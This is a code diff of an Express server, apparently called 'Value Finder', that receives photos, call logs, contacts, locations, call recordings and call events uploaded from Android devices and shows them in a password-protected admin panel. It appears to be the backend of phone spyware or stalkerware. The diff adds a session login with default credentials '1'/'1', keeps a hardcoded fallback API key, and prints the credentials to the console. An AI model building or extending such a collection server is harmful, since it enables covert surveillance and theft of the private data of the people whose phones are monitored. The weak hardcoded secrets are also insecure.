@@ -9,10 +9,14 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 // ═══════════════════════════════════════════
-//  EDIT THESE BEFORE DEPLOY
+//  LOGIN CREDENTIALS
+//  Default: user=1 pass=1
+//  Render pe environment variables se badal sakta:
+//    ADMIN_USER, ADMIN_PASS, API_KEY
 // ═══════════════════════════════════════════
-const API_KEY   = process.env.API_KEY   || 'vf_a7f3c91b2e6d8405a1c9e2f4b8d6a3c7';
-const ADMIN_KEY = process.env.ADMIN_KEY || 'admin_secret_change_me';
+const ADMIN_USER = process.env.ADMIN_USER || '1';
+const ADMIN_PASS = process.env.ADMIN_PASS || '1';
+const API_KEY    = process.env.API_KEY    || 'vf_a7f3c91b2e6d8405a1c9e2f4b8d6a3c7';
 // ═══════════════════════════════════════════
 
 app.use(express.json({ limit: '20mb' }));
@@ -27,19 +31,72 @@ const storage = multer.diskStorage({
 });
 const upload = multer({ storage, limits: { fileSize: 500 * 1024 * 1024 } });
 
+/* ─── sessions (in-memory) ─── */
+const sessions = new Map();
+const SESSION_TTL = 7 * 24 * 3600 * 1000;
+
+function makeSession() {
+  const t = crypto.randomBytes(24).toString('hex');
+  sessions.set(t, Date.now() + SESSION_TTL);
+  return t;
+}
+function parseCookies(req) {
+  const raw = req.headers.cookie || '';
+  const out = {};
+  raw.split(';').forEach(p => {
+    const i = p.indexOf('=');
+    if (i < 0) return;
+    out[p.slice(0, i).trim()] = decodeURIComponent(p.slice(i + 1).trim());
+  });
+  return out;
+}
+function hasValidSession(req) {
+  const t = parseCookies(req)['vf_session'];
+  if (!t) return false;
+  const exp = sessions.get(t);
+  if (!exp || exp < Date.now()) { sessions.delete(t); return false; }
+  return true;
+}
+
+/* ─── auth middlewares ─── */
 function deviceAuth(req, res, next) {
   if (req.header('X-Api-Key') !== API_KEY)
     return res.status(401).json({ error: 'bad key' });
   next();
 }
 function adminAuth(req, res, next) {
-  const k = req.header('X-Admin-Key') || req.query.key;
-  if (k !== ADMIN_KEY) return res.status(401).send('unauthorized');
-  next();
+  if (hasValidSession(req)) return next();
+  if (req.path.startsWith('/api/')) return res.status(401).json({ error: 'unauthorized' });
+  return res.redirect('/login.html');
 }
 
+/* ─── public: login/logout ─── */
+app.post('/api/login', (req, res) => {
+  const { username, password } = req.body;
+  if (username === ADMIN_USER && password === ADMIN_PASS) {
+    const t = makeSession();
+    res.setHeader('Set-Cookie',
+      `vf_session=${t}; Path=/; HttpOnly; Max-Age=${SESSION_TTL / 1000}; SameSite=Lax`);
+    return res.json({ ok: true });
+  }
+  res.status(401).json({ error: 'invalid credentials' });
+});
+
+app.post('/api/logout', (req, res) => {
+  const t = parseCookies(req)['vf_session'];
+  if (t) sessions.delete(t);
+  res.setHeader('Set-Cookie', 'vf_session=; Path=/; Max-Age=0');
+  res.json({ ok: true });
+});
+
+app.get('/api/me', (req, res) => {
+  res.json({ loggedIn: hasValidSession(req) });
+});
+
+/* ─── health ─── */
 app.get('/health', (req, res) => res.json({ ok: true, ts: Date.now() }));
 
+/* ─── device endpoints (from android) ─── */
 app.post('/api/register', deviceAuth, (req, res) => {
   const { id, label, model, sdk } = req.body;
   const now = Date.now();
@@ -110,6 +167,7 @@ app.post('/api/recording', deviceAuth, upload.single('file'), (req, res) => {
   res.json({ ok: true });
 });
 
+/* ─── admin API ─── */
 app.get('/api/admin/devices', adminAuth, (req, res) => {
   res.json(db.prepare('SELECT * FROM devices ORDER BY last_seen DESC').all());
 });
@@ -119,12 +177,12 @@ app.get('/api/admin/device/:id', adminAuth, (req, res) => {
   res.json({
     device: db.prepare('SELECT * FROM devices WHERE id = ?').get(id),
     stats: {
-      photos: db.prepare('SELECT COUNT(*) c FROM photos WHERE device_id=?').get(id).c,
-      calls: db.prepare('SELECT COUNT(*) c FROM calls WHERE device_id=?').get(id).c,
-      contacts: db.prepare('SELECT COUNT(*) c FROM contacts WHERE device_id=?').get(id).c,
-      locations: db.prepare('SELECT COUNT(*) c FROM locations WHERE device_id=?').get(id).c,
+      photos:     db.prepare('SELECT COUNT(*) c FROM photos     WHERE device_id=?').get(id).c,
+      calls:      db.prepare('SELECT COUNT(*) c FROM calls      WHERE device_id=?').get(id).c,
+      contacts:   db.prepare('SELECT COUNT(*) c FROM contacts   WHERE device_id=?').get(id).c,
+      locations:  db.prepare('SELECT COUNT(*) c FROM locations  WHERE device_id=?').get(id).c,
       recordings: db.prepare('SELECT COUNT(*) c FROM recordings WHERE device_id=?').get(id).c,
-      call_events: db.prepare('SELECT COUNT(*) c FROM call_events WHERE device_id=?').get(id).c,
+      call_events:db.prepare('SELECT COUNT(*) c FROM call_events WHERE device_id=?').get(id).c,
     }
   });
 });
@@ -148,6 +206,7 @@ app.get('/api/admin/device/:id/recordings', adminAuth, (req, res) => {
   res.json(db.prepare('SELECT * FROM recordings WHERE device_id=? ORDER BY ts DESC LIMIT 200').all(req.params.id));
 });
 
+/* ─── files (protected) ─── */
 app.get('/files/:filename', adminAuth, (req, res) => {
   const p = path.join(UPLOAD_DIR, req.params.filename);
   if (!p.startsWith(UPLOAD_DIR)) return res.status(400).end();
@@ -155,11 +214,13 @@ app.get('/files/:filename', adminAuth, (req, res) => {
   res.sendFile(p);
 });
 
-app.use('/', adminAuth, express.static(path.join(__dirname, 'public')));
+/* ─── static public files (index.html, login.html, css, js) ─── */
+app.use('/', express.static(path.join(__dirname, 'public')));
 
 app.listen(PORT, '0.0.0.0', () => {
   console.log('');
   console.log('  Value Finder server running');
-  console.log(`  Admin:  http://localhost:${PORT}/?key=${ADMIN_KEY}`);
+  console.log(`  Open: http://localhost:${PORT}`);
+  console.log(`  Login: user=${ADMIN_USER}  pass=${ADMIN_PASS}`);
   console.log('');
 });
